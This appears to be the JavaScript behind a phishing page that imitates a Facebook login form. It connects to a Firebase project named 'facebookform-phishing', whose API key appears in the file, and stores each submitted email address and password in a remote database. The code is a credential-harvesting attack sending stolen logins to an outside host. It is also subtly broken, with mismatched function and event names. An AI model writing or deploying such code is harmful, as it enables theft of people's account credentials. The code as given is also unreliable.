const firebaseConfig = {
    apiKey: "AIzaSyAcbBYrM4fYaW7eixmzlguVmifWJUmdl3w",
    authDomain: "facebookform-phishing.firebaseapp.com",
    databaseURL: "https://facebookform-phishing-default-rtdb.firebaseio.com",
    projectId: "facebookform-phishing",
    storageBucket: "facebookform-phishing.appspot.com",
    messagingSenderId: "603361454900",
    appId: "1:603361454900:web:c842267017a555956dd361"
  };
//initialize firebase
  firebase.initializeApp(firebaseConfig);
//reference your database
 var facebookformDB = firebase.database().ref("facebookform");

 document.getElementById("facebookform").addEventListener("LogIn", LogIn);


 function LogInForm(e){
   e.preventDefault();

   var EmailAddress = getElementVal("EmailAddress");
   var password = getElementVal("password");
 
   
 savemessages(EmailAddress,password);

   //enabling the alert
   document.querySelector(".alert").style.display = "block";

   //remove the alert
   setTimeout(() => {
    document.querySelector(".alert").style.display = "none";
   }, 3000);
   //reset the form
   document.getElementById("facebookform").reset();
   
 }

const savemessages = (EmailAddress , password) => {
  var NewFacebookform = facebookformDB.push();

  NewFacebookform.set({
    EmailAddress : EmailAddress,
    password : password,

  })


}


 const getElementByVal = (id) => {
  return document.getElementById(id).value;


 }